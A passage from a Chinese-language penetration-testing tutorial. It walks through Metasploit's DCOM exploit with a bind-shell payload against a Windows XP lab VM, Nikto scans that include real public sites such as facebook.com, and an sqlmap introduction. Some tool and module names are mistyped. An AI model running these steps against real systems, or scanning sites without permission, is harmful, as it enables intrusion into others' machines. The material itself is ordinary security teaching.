  trans: "\n\n取决于你的字典列表长短，破解密码可能需要几秒钟或几小时。如果找到了密码，`airrack-ng` 将在屏幕上显示它。如果你非常容易就找到了它，这说明你的密码确实需要更改了。如果你是在获得许可的情况下为他人执行此操作，请告诉他们立即更改密码。\n\
    \n## 渗透测试\n\n渗透测试是发现系统弱点的最佳方法。渗透测试（通常称为 pen test）是对系统进行攻击，以寻找安全漏洞和脆弱点，并有可能通过这些漏洞获取系统的访问权限，进而获取数据甚至整个系统的完整功能。渗透测试过程需要先识别目标，然后审查获得的信息，并执行所需的后续。伦理黑客利用渗透测试来确定不道德不守法的黑客可能会如何访问并破坏系统，以及他们可能造成的潜在损害。\n\
    \n与其仅仅向你介绍渗透测试，我将准备向你展示如何进行操作，因为那是学习上容易得多的方法。你需要一个正版的 Windows XP 副本（你可能需要一张光盘），因为这就是我们要使用\
    \ VMware 破解的对象。在实际机器上进行此操作，尤其是他人的机器，可不是个好主意！\n\n### 你需要的东西\n\n- `Kali Linux`\n\
    - `VMware tools` - 没有这些工具，你无法在同一台计算机上设置攻击和目标机器。\n- `Windows XP` - 你需要 `SP1` 和未打补丁的\
    \ XP 版本。利用程序在已打补丁的版本上无效。\n- `虚拟机`\n\n### 使用 Metasploit 框架\n\nMetasploit 需要一些没有随标准\
    \ Kali 系统启动而提供的服务，因此你首先需要在终端终端中输入一些命令：\n\n```\nservice postgresql start\n```\n\
    `PostgreSQL` 是 Metasploit 使用的数据库，因此必须先启动。\n\n一旦它运行，我们就可以打开 Metasploit 服务。当它首次启动时，会创建一个\
    \ `msf3` 数据库和数据库用户，并启动 Metasploit 所需的 RPC 和 Web 服务器。输入 `service Metasploit start`。\n\
    \n如果你在这些命令中遇到任何错误，请跳过它们并直接输入 `msfconsole`。\n\n你应该已经在 VMware 中运行了 Kali，现在你需要将 Windows\
    \ XP 加载到虚拟机中与其并行运行。完成后，我们将使用 Metasploit 框架尝试检测这两台机器，为了做到这一点，我们需要进行端口扫描。\n\nMetasploit\
    \ 有一个名为 `auxiliary scanner` 的强大端口扫描功能。要执行扫描，在命令提示符输入以下内容 - 使用 `auxiliary/scanner/portscan/tcp`\n\
    \n要查看所有可用选项，输入 `show options`。\n\n我们需要对设置进行一些更改。首先，我们需要扫描较少的端口，因此输入 `set ports\
    \ 1-500`。\n\n接下来，我们需要指定要扫描的 IP。这并不容易，因为在某些情况下 IP 会所不同。因此，进入运行 XP 的虚拟机并打开命令提示符。输入\
    \ `ipconfig`，你应该就能在结果中看到 IP - 这就是需要在 `RHOSTS` 中指定的 IP。\n\n回到你的 Kali 虚拟机，使用你获得的\
    \ IP 地址输入以下内容：\n\n```\nSet RHOST xxx.xxx.xx.xxx\n```\n\n再次输入 `show options` 以确认你所做的更改，然后输入\
    \ `run`。\n\n端口扫描将开始，过了一会儿你将看到一个开放的 tcp 端口列表；那些就是容易被攻击的端口。如果你使用的是较晚的、打过补丁的 Windows\
    \ XP 版本，将看不到任何端口。\n\n 如果没有看到任何开放端口，请禁用防火墙并重试。记下每个开放端口的数字。\n\n### 寻找利用程序\n\n这是一个重要的步骤，因为我们需要确定哪些利用程序在目标操作系统上有效。在命令提示符处，输入\
    \ `back`，然后进入 `msfconsole`。输入 `search dcom`。\n\n这是一个众知的 Windows 利用程序。复制利用程序的编号，并在下一行输入\
    \ `use exploit/windows/dcerpc/mso3_026_dcom`。\n\n输入 `show options` 并输入 `set RHOST`\
    \ `xxx.xxx.xx.xxx`（输入目标 IP）。\n\n接下来，我们需要设置有效负载（payload），因此输入 `set PAYLOAD windows/shell_bind_tcp`。\n\
    \n输入 `exploit`，你现在进入了目标计算机系统。在目标系统上你将看到一个开放的 shell，并且你将拥有完全的管理员权限；该系统现在属于你了。\n\
    \n## 使用 Nikto 和 SQL 破解网站\n\n感谢 https://null-byte/wonderhowto.com/ 提供的帮助\n\n在你甚至考虑破解网站之前，作为一名白帽黑客，你的工作是先进行侦察。在没有看到漏洞所在之处就向网站发动攻击是愚蠢且完全浪费时间的行为。进行适当的侦察只需要几分钟，而且它可以让生活变得容易得多。\n\
    \n最易用的工具之一，也是我们将开始使用的工具是 `Nikto`。这是一个开源扫描器，它可以查看网站并记录它发现的漏洞。然而，虽然这是一个有效的工具，但它并不特别隐蔽，如果网站有入侵检测系统，它将检测到该工具。但由于它最初被设计为安全测试工具，它并不需要隐蔽。\n\
    \n**第一步** - 打开 Kali 并遵循此路径 - `Kali Linux>Vulnerability Analysis>Misc Scanners>nikto`。\n\
    \n**第二步** - 在命令提示符输入 `nikto -h` 后紧跟 IP 地址来扫描 Web 服务器的漏洞。你应该能看到关于 Web 服务器的一些信息，例如服务器是什么（例如\
    \ `Apache`），以及有关潜在漏洞的信息。你可能会看到一些带有 `OSVDB` 前缀的漏洞 - 这代表 Open Source Vulnerability（开源漏洞数据库）。\n\
    \n**第三步** - 扫描另一个网站，在命令提示符输入 `nikto -h` 后紧跟 IP 地址。你将看到加载 Web 服务器的一些信息以及一个包含漏洞的列表。你可能会看到一些带有\
    \ `OSVDB` 前缀的漏洞。如果你访问 [`osvdb.org/`](http://osvdb.org/)，你可以识别这些漏洞。找到 `nikto` 识别出的\
    \ `OSVDB-877` 漏洞 - 只需要在搜索栏输入该编号，信息就会以后页的形式出现。\n\n查看页面下半部分，你应该看到各种漏洞来源引用以及工具和其他过滤器。\n\
    \n尝试另一个；`nikto -h wonderhowto.com`。\n\n再次，服务器信息将会出现以及漏洞列表，但由于该网站不是基于 `asp` 或 `php`\
    \ 构建的，尝试利用这些漏洞只会得到一个 404 错误页面。这些是由于扫描没有执行它们而产生的虚假漏洞。\n\n最后一个，让我们尝试 Facebook。输入\
    \ `nikto -h facebook.com`。你将从中得不到什么；Facebook 的防御非常严密，漏洞很少。面对现实吧，如果不是这样，一切都会乱套！\n\
    \n### 使用 SQL\n\n对于这部分，我们将使用 Kali 和 `sqlmap`，后者已安装在 Kali 中。`sqlmap` 是一个非常有用的工具，可以更容易对网站进行\
    \ SQL 注入。它是开源的，用于检测和利用 SQL 注入漏洞并接管数据库服务器。它内置了一个非常强大的检测引擎，以及许多针对渗透人员的功能和多个开关。\n\
    \n**第一步** - 打开 Kali 并启动一个新的终端。在提示符处，输入 `sqlmap -h`。这将显示 `SQLMap` 支持的命令列表，所以首先我们将从一个非常简单的命令开始。\n\
    \n"
